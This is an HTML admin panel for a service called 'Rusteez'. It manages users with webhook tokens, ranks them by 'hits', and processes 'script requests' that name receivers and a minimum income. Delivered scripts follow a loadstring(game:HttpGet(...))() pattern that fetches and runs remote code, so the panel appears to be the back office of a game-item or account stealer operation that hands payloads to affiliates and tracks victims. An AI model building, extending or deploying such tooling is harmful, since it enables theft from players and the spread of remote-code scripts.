<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="style.css">
    <title>Rusteez | Admin Panel</title>
    <style>
        #admin-lock { position: fixed; inset: 0; background: #0a0a0c; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.8); justify-content:center; align-items:center; z-index:1000; }
        .modal-content { background:var(--bg-sidebar); padding:20px; border-radius:8px; width:450px; border:1px solid var(--accent); }
        textarea { width:100%; height:120px; background:#000; color:var(--success); border:1px solid #333; margin-top:10px; font-family:monospace; }
        #admin-message-list { height: 300px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 5px; border: 1px solid #222; }
        .admin-msg { padding: 5px; border-bottom: 1px solid #111; font-size: 0.9em; }
    </style>
</head>
<body>

    <div id="admin-lock">
        <div class="auth-card">
            <h2 style="color:var(--accent)">MASTER ACCESS</h2>
            <input type="password" id="master-input" placeholder="Master Password">
            <button onclick="verifyMaster()">Unlock Panel</button>
            <p id="lock-error" style="color:var(--danger); margin-top:10px;"></p>
        </div>
    </div>

    <div id="admin-content" class="dashboard-container" style="display:none;">
        <div class="sidebar">
            <h2 style="color:var(--accent); text-align:center;">ADMIN</h2>
            <nav style="margin-top:20px;">
                <button class="tab-btn active" onclick="openTab(event, 'adm-users')">👥 Users</button>
                <button class="tab-btn" onclick="openTab(event, 'adm-requests')">📜 Script Requests</button>
                <button class="tab-btn" onclick="openTab(event, 'adm-leaderboard')">🏆 Leaderboard</button>
                <button class="tab-btn" onclick="openTab(event, 'adm-chat')">💬 Chat Monitor</button>
            </nav>
            <div style="margin-top:auto; padding:10px;">
                <button onclick="window.location.href='/dashboard'" style="background:var(--bg-card);">Dashboard</button>
            </div>
        </div>

        <div class="main-content">
            <div id="adm-users" class="tab-content active">
                <h1>Users Management</h1>
                <div id="users-list" class="hits-container"></div>
            </div>
            
            <div id="adm-requests" class="tab-content">
                <h1>Pending Requests</h1>
                <div id="requests-list"></div>
            </div>

            <div id="adm-leaderboard" class="tab-content">
                <h1>Global Leaderboard</h1>
                <div id="leaderboard-list"></div>
            </div>

            <div id="adm-chat" class="tab-content">
                <h1>Global Chat Monitoring</h1>
                <div id="admin-message-list"></div>
            </div>
        </div>
    </div>

    <div id="scriptModal" class="modal">
        <div class="modal-content">
            <h3>Process Script Request</h3>
            <input type="hidden" id="m-uuid">
            <input type="text" id="m-rec" placeholder="Receiver Name">
            <input type="text" id="m-inc" placeholder="Income Level">
            <textarea id="m-code" placeholder="loadstring(game:HttpGet(...))()"></textarea>
            <button onclick="deliverScript()" style="margin-top:15px;">DELIVER SCRIPT</button>
            <button onclick="closeModal()" style="background:transparent; color:gray;">Cancel</button>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let MASTER_KEY = "";

        async function verifyMaster() {
            const pass = document.getElementById('master-input').value;
            const res = await fetch('/api/admin/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: pass })
            });
            if (res.ok) {
                MASTER_KEY = pass;
                document.getElementById('admin-lock').style.display = 'none';
                document.getElementById('admin-content').style.display = 'flex';
                loadAll();
            } else { document.getElementById('lock-error').innerText = "Access Denied."; }
        }

        async function loadAll() {
            const h = { 'x-admin-key': MASTER_KEY };
            
            const uReq = await fetch('/api/admin/users', { headers: h });
            const users = await uReq.json();
            document.getElementById('users-list').innerHTML = users.map(u => `
                <div class="hit-card">
                    <strong>${u.username}</strong> (${u.email})<br>
                    UUID: <code>${u.webhookToken}</code> | Hits: <span style="color:var(--success)">${u.hitsCount || 0}</span>
                    <div style="margin-top:10px; display:flex; gap:10px;">
                        <button onclick="deleteUser('${u._id}')" style="background:var(--danger); width:auto; padding:5px 10px;">Delete</button>
                        <button onclick="sendTestHit('${u.webhookToken}')" style="background:var(--success); width:auto; padding:5px 10px;">Send Hit</button>
                        <button onclick="window.open('/webhook/${u.webhookToken}', '_blank')" style="background:var(--bg-sidebar); width:auto; padding:5px 10px;">Access Webhook</button>
                    </div>
                </div>
            `).join('');

            const rReq = await fetch('/api/admin/requests', { headers: h });
            const reqs = await rReq.json();
            document.getElementById('requests-list').innerHTML = reqs.map(r => `
                <div class="hit-card" style="border-left:4px solid var(--accent);">
                    <strong>${r.username}</strong> Request:<br>
                    Receivers: <code>${r.receivers}</code> | Min Income: <code>${r.minIncome}</code>
                    <button onclick="openModal('${r.webhookuuid}', '${r.receivers}', '${r.minIncome}')" style="margin-top:10px;">Process</button>
                </div>
            `).join('');

            const sorted = [...users].sort((a,b) => (b.hitsCount || 0) - (a.hitsCount || 0));
            document.getElementById('leaderboard-list').innerHTML = sorted.map((u, i) => `
                <div style="padding:10px; background:var(--bg-sidebar); margin-bottom:5px; border-radius:5px; display:flex; justify-content:space-between;">
                    <span>#${i+1} <strong>${u.username}</strong></span>
                    <span style="color:var(--success)">${u.hitsCount || 0} Hits</span>
                </div>
            `).join('');
        }

        async function sendTestHit(token) {
            await fetch(`/webhook/${token}`);
            alert("Hit Sent!");
            loadAll();
        }

        function openModal(uuid, rec='', inc='') {
            document.getElementById('m-uuid').value = uuid;
            document.getElementById('m-rec').value = rec;
            document.getElementById('m-inc').value = inc;
            document.getElementById('scriptModal').style.display = 'flex';
        }

        function closeModal() { document.getElementById('scriptModal').style.display = 'none'; }

        async function deliverScript() {
            await fetch('/api/scripts/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    webhookuuid: document.getElementById('m-uuid').value,
                    receiver: document.getElementById('m-rec').value,
                    minincome: document.getElementById('m-inc').value,
                    script: document.getElementById('m-code').value
                })
            });
            alert("Delivered!");
            closeModal();
            loadAll();
        }

        socket.on('new_script_request', loadAll);
        
        socket.on('new_general_message', (msg) => {
            const list = document.getElementById('admin-message-list');
            const div = document.createElement('div');
            div.className = 'admin-msg';
            div.innerHTML = `<span style="color:var(--accent)">[${new Date().toLocaleTimeString()}]</span> <strong>${msg.senderName}:</strong> ${msg.content}`;
            list.prepend(div);
        });

        function openTab(evt, tabName) {
            const contents = document.getElementsByClassName("tab-content");
            for (let c of contents) c.classList.remove("active");
            document.getElementById(tabName).classList.add("active");
            const buttons = document.getElementsByClassName("tab-btn");
            for (let b of buttons) b.classList.remove("active");
            evt.currentTarget.classList.add("active");
        }
    </script>
</body>
</html>
